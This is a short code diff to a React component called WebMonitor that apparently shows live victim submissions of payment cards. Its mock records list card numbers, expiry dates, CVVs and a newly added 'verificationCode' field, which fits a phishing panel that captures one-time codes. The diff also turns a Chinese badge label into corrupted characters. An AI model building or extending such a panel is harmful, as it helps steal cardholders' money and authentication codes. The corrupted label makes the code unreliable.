@@ -172,11 +172,11 @@ const submissionData: UserSubmission[] = [
     },
     submitCount: 5,
     submitHistory: [
-      { timestamp: "10:20", cardType: "debit", partialCard1: "5555", partialCard2: "444", fullCard: "5555 **** **** 4444", expiryDate: "08/25", cvv: "***" },
-      { timestamp: "10:18", cardType: "credit", partialCard1: "4111", partialCard2: "111", fullCard: "4111 1111 1111 1111", expiryDate: "11/25", cvv: "212" },
-      { timestamp: "10:15", cardType: "prepaid", partialCard1: "3782", partialCard2: "234", fullCard: "3782 **** **** 1234", expiryDate: "05/26", cvv: "***" },
-      { timestamp: "10:12", cardType: "debit", partialCard1: "6011", partialCard2: "567", fullCard: "6011 **** **** 5678", expiryDate: "07/27", cvv: "***" },
-      { timestamp: "10:10", cardType: "credit", partialCard1: "4532", partialCard2: "890", fullCard: "4532 **** **** 8901", expiryDate: "04/28", cvv: "***" }
+      { timestamp: "10:20", cardType: "debit", partialCard1: "5555", partialCard2: "444", fullCard: "5555 **** **** 4444", expiryDate: "08/25", cvv: "***", verificationCode: "5812" },
+      { timestamp: "10:18", cardType: "credit", partialCard1: "4111", partialCard2: "111", fullCard: "4111 1111 1111 1111", expiryDate: "11/25", cvv: "212", verificationCode: "7534" },
+      { timestamp: "10:15", cardType: "prepaid", partialCard1: "3782", partialCard2: "234", fullCard: "3782 **** **** 1234", expiryDate: "05/26", cvv: "***", verificationCode: "1298" },
+      { timestamp: "10:12", cardType: "debit", partialCard1: "6011", partialCard2: "567", fullCard: "6011 **** **** 5678", expiryDate: "07/27", cvv: "***", verificationCode: "6543" },
+      { timestamp: "10:10", cardType: "credit", partialCard1: "4532", partialCard2: "890", fullCard: "4532 **** **** 8901", expiryDate: "04/28", cvv: "***", verificationCode: "3921" }
     ],
     enterTime: "10:05:22",
     updateTime: "10:22:15",
@@ -296,7 +296,7 @@ export function WebMonitor() {
                 🔴 LIVE - {onlineCount} 在线处理
               </Badge>
               <Badge variant="outline" className="bg-blue-50 text-blue-600 border-blue-200">
-                今日提交: {todaySubmissions}
+                今日提���: {todaySubmissions}
               </Badge>
             </div>
           </div>
